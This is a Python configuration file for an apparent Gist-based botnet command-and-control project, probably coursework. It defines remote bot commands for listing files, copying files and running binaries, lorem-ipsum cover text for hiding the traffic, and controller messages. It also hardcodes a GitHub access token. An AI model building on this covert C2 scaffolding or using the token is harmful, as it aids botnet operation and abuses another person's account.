from enum import Enum

TOKEN = "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"  # Your GitHub personal access token
API_URL = "https://api.github.com/gists"  # The URL of the GitHub Gist API
HEADERS = {"Authorization": f"Bearer {TOKEN}"}  # Set the authorization header

CONTROLLER_URL = "http://127.0.0.1:5000"
CHECKING_BOT_ALIVE_PERIOD_SECONDS = 20
CHECKING_COMMENT_PERIOD_SECONDS = 5
BOT_MESSAGES = {}
CONTROLLER_MESSAGES = {}
PAGE_SIZE = 100

SUPPORTED_COMMANDS = ["w", "ls", "id", "copy", "binary"]
COMMANDS_WITH_ARGUMENT = ["ls", "copy", "binary"]

BOT_MESSAGES["w"] = "Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Phasellus et lorem id felis nonummy placerat. Fusce nibh. Pellentesque sapien. Sed elit dui, pellentesque a, faucibus vel, interdum nec, diam. Nulla quis diam. Maecenas fermentum, sem in pharetra pellentesque, velit turpis volutpat ante, in pharetra metus odio a lectus. Fusce wisi. Cum sociis natoque penatibus et magnis dis parturient montes, nascetur ridiculus mus. Neque porro quisquam est, qui dolorem ipsum quia dolor sit amet, consectetur, adipisci velit, sed quia non numquam eius modi tempora incidunt ut labore et dolore magnam aliquam quaerat voluptatem. Curabitur ligula sapien, pulvinar a vestibulum quis, facilisis vel sapien. Pellentesque pretium lectus id turpis. Nullam rhoncus aliquam metus. In enim a arcu imperdiet malesuada. Sed vel lectus. Donec odio tempus molestie, porttitor ut, iaculis quis, sem. Aliquam ornare wisi eu metus. Integer in sapien. Aliquam ornare wisi eu metus."
BOT_MESSAGES["ls"] = "Nullam feugiat, turpis at pulvinar vulputate, erat libero tristique tellus, nec bibendum odio risus sit amet ante. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Etiam posuere lacus quis dolor. Quis autem vel eum iure reprehenderit qui in ea voluptate velit esse quam nihil molestiae consequatur, vel illum qui dolorem eum fugiat quo voluptas nulla pariatur? Sed ac dolor sit amet purus malesuada congue. Nulla accumsan, elit sit amet varius semper, nulla mauris mollis quam, tempor suscipit diam nulla vel leo. Quis autem vel eum iure reprehenderit qui in ea voluptate velit esse quam nihil molestiae consequatur, vel illum qui dolorem eum fugiat quo voluptas nulla pariatur? Maecenas fermentum, sem in pharetra pellentesque, velit turpis volutpat ante, in pharetra metus odio a lectus. Itaque earum rerum hic tenetur a sapiente delectus, ut aut reiciendis voluptatibus maiores alias consequatur aut perferendis doloribus asperiores repellat. Mauris metus. Suspendisse sagittis ultrices augue."
BOT_MESSAGES["id"] = "Cum sociis natoque penatibus et magnis dis parturient montes, nascetur ridiculus mus. Vivamus porttitor turpis ac leo. Nullam faucibus mi quis velit. Nam sed tellus id magna elementum tincidunt. Nunc tincidunt ante vitae massa. Maecenas fermentum, sem in pharetra pellentesque, velit turpis volutpat ante, in pharetra metus odio a lectus. Aliquam id dolor. Fusce consectetuer risus a nunc. Vestibulum erat nulla, ullamcorper nec, rutrum non, nonummy ac, erat. Donec quis nibh at felis congue commodo. Quisque tincidunt scelerisque libero."
BOT_MESSAGES["copy"] = "Aliquam erat volutpat. Vivamus ac leo pretium faucibus. Curabitur ligula sapien, pulvinar a vestibulum quis, facilisis vel sapien. Vestibulum erat nulla, ullamcorper nec, rutrum non, nonummy ac, erat. Etiam commodo dui eget wisi. Itaque earum rerum hic tenetur a sapiente delectus, ut aut reiciendis voluptatibus maiores alias consequatur aut perferendis doloribus asperiores repellat. Phasellus et lorem id felis nonummy placerat. In rutrum. Cras pede libero, dapibus nec, pretium sit amet, tempor quis. Mauris dolor felis, sagittis at, luctus sed, aliquam non, tellus. Integer pellentesque quam vel velit. Quisque porta. Phasellus et lorem id felis nonummy placerat. Nulla accumsan, elit sit amet varius semper, nulla mauris mollis quam, tempor suscipit diam nulla vel leo. Temporibus autem quibusdam et aut officiis debitis aut rerum necessitatibus saepe eveniet ut et voluptates repudiandae sint et molestiae non recusandae. Praesent id justo in neque elementum ultrices. Nullam feugiat, turpis at pulvinar vulputate, erat libero tristique tellus, nec bibendum odio risus sit amet ante. Nulla pulvinar eleifend sem. Etiam quis quam. Maecenas libero."
BOT_MESSAGES["binary"] = "Ut tempus purus at lorem. Cras elementum. Aliquam erat volutpat. Aenean placerat. Proin pede metus, vulputate nec, fermentum fringilla, vehicula vitae, justo. Cras pede libero, dapibus nec, pretium sit amet, tempor quis. Mauris dolor felis, sagittis at, luctus sed, aliquam non, tellus. Pellentesque habitant morbi tristique senectus et netus et malesuada fames ac turpis egestas. Morbi imperdiet, mauris ac auctor dictum, nisl ligula egestas nulla, et sollicitudin sem purus in lacus. Etiam dui sem, fermentum vitae, sagittis id, malesuada in, quam. Fusce dui leo, imperdiet in, aliquam sit amet, feugiat eu, orci. Curabitur ligula sapien, pulvinar a vestibulum quis, facilisis vel sapien. Aliquam erat volutpat. Nullam feugiat, turpis at pulvinar vulputate, erat libero tristique tellus, nec bibendum odio risus sit amet ante. Etiam quis quam. Nulla non arcu lacinia neque faucibus fringilla. In dapibus augue non sapien. Cras elementum."

CONTROLLER_MESSAGES["w"] = "Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Phasellus et lorem id felis nonummy placerat. Fusce nibh. Pellentesque sapien. Sed elit dui, pellentesque a, faucibus vel, interdum nec, diam. Nulla quis diam. Maecenas fermentum, sem in pharetra pellentesque, velit turpis volutpat ante, in pharetra metus odio a lectus. Fusce wisi. Cum sociis natoque penatibus et magnis dis parturient montes, nascetur ridiculus mus. Neque porro quisquam est, qui dolorem ipsum quia dolor sit amet, consectetur, adipisci velit, sed quia non numquam eius modi tempora incidunt ut labore et dolore magnam aliquam quaerat voluptatem. Curabitur ligula sapien, pulvinar a vestibulum quis, facilisis vel sapien. Pellentesque pretium lectus id turpis. Nullam rhoncus aliquam metus. In enim a arcu imperdiet malesuada. Sed vel lectus. Donec odio tempus molestie, porttitor ut, iaculis quis, sem. Aliquam ornare wisi eu metus. Integer in sapien. Aliquam ornare wisi eu metus."
CONTROLLER_MESSAGES["ls"] = "Nullam feugiat, turpis at pulvinar vulputate, erat libero tristique tellus, nec bibendum odio risus sit amet ante. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Etiam posuere lacus quis dolor. Quis autem vel eum iure reprehenderit qui in ea voluptate velit esse quam nihil molestiae consequatur, vel illum qui dolorem eum fugiat quo voluptas nulla pariatur? Sed ac dolor sit amet purus malesuada congue. Nulla accumsan, elit sit amet varius semper, nulla mauris mollis quam, tempor suscipit diam nulla vel leo. Quis autem vel eum iure reprehenderit qui in ea voluptate velit esse quam nihil molestiae consequatur, vel illum qui dolorem eum fugiat quo voluptas nulla pariatur? Maecenas fermentum, sem in pharetra pellentesque, velit turpis volutpat ante, in pharetra metus odio a lectus. Itaque earum rerum hic tenetur a sapiente delectus, ut aut reiciendis voluptatibus maiores alias consequatur aut perferendis doloribus asperiores repellat. Mauris metus. Suspendisse sagittis ultrices augue."
CONTROLLER_MESSAGES["id"] = "Cum sociis natoque penatibus et magnis dis parturient montes, nascetur ridiculus mus. Vivamus porttitor turpis ac leo. Nullam faucibus mi quis velit. Nam sed tellus id magna elementum tincidunt. Nunc tincidunt ante vitae massa. Maecenas fermentum, sem in pharetra pellentesque, velit turpis volutpat ante, in pharetra metus odio a lectus. Aliquam id dolor. Fusce consectetuer risus a nunc. Vestibulum erat nulla, ullamcorper nec, rutrum non, nonummy ac, erat. Donec quis nibh at felis congue commodo. Quisque tincidunt scelerisque libero."
CONTROLLER_MESSAGES["copy"] = "Aliquam erat volutpat. Vivamus ac leo pretium faucibus. Curabitur ligula sapien, pulvinar a vestibulum quis, facilisis vel sapien. Vestibulum erat nulla, ullamcorper nec, rutrum non, nonummy ac, erat. Etiam commodo dui eget wisi. Itaque earum rerum hic tenetur a sapiente delectus, ut aut reiciendis voluptatibus maiores alias consequatur aut perferendis doloribus asperiores repellat. Phasellus et lorem id felis nonummy placerat. In rutrum. Cras pede libero, dapibus nec, pretium sit amet, tempor quis. Mauris dolor felis, sagittis at, luctus sed, aliquam non, tellus. Integer pellentesque quam vel velit. Quisque porta. Phasellus et lorem id felis nonummy placerat. Nulla accumsan, elit sit amet varius semper, nulla mauris mollis quam, tempor suscipit diam nulla vel leo. Temporibus autem quibusdam et aut officiis debitis aut rerum necessitatibus saepe eveniet ut et voluptates repudiandae sint et molestiae non recusandae. Praesent id justo in neque elementum ultrices. Nullam feugiat, turpis at pulvinar vulputate, erat libero tristique tellus, nec bibendum odio risus sit amet ante. Nulla pulvinar eleifend sem. Etiam quis quam. Maecenas libero."
CONTROLLER_MESSAGES["binary"] = "Ut tempus purus at lorem. Cras elementum. Aliquam erat volutpat. Aenean placerat. Proin pede metus, vulputate nec, fermentum fringilla, vehicula vitae, justo. Cras pede libero, dapibus nec, pretium sit amet, tempor quis. Mauris dolor felis, sagittis at, luctus sed, aliquam non, tellus. Pellentesque habitant morbi tristique senectus et netus et malesuada fames ac turpis egestas. Morbi imperdiet, mauris ac auctor dictum, nisl ligula egestas nulla, et sollicitudin sem purus in lacus. Etiam dui sem, fermentum vitae, sagittis id, malesuada in, quam. Fusce dui leo, imperdiet in, aliquam sit amet, feugiat eu, orci. Curabitur ligula sapien, pulvinar a vestibulum quis, facilisis vel sapien. Aliquam erat volutpat. Nullam feugiat, turpis at pulvinar vulputate, erat libero tristique tellus, nec bibendum odio risus sit amet ante. Etiam quis quam. Nulla non arcu lacinia neque faucibus fringilla. In dapibus augue non sapien. Cras elementum."

CONTROLLER_CMD_INFO = "Please enter command in current format: \n <GIST_ID> <COMMAND_NAME> <OPTIONAL_ARGUMENTS> \n " \
                      "Supported commands: w, ls, id, copy, binary \n For list of bots use command bots"
CONTROLLER_REQ_CREATE_MSG = "[{id}] Request was created: {request}"
CONTROLLER_REQ_INVALID_MSG = "Invalid request!"
CONTROLLER_CHECK_BOTS_MSG = "[INFO] Checking bots alive"
CONTROLLER_BOT_DISCONNECT_MSG = "[INFO] Bot with id {id} disconnect."
CONTROLLER_NEW_BOT_MSG = "[INFO] New bot has connected."
CONTROLLER_INPUT_EMPTY_ERR = "[ERROR] Empty input!"
CONTROLLER_MISSING_COMMAND_ERR = "[ERROR] Second argument (command) is missing!"
CONTROLLER_UNSUPPORTED_COMMAND_ERR = "[ERROR] Not supported command!"
CONTROLLER_MISSING_COMMAND_ARG_ERR = "[ERROR] This command needs argument. Argument is missing!"
CONTROLLER_UNKNOWN_BOT_ERR = "[ERROR] Bot with this gist ID does not exist!"
CONTROLLER_COMMAND_TIMEOUT = "TIMEOUT!"


class Type(Enum):
    CONTROLLER = 1
    BOT = 2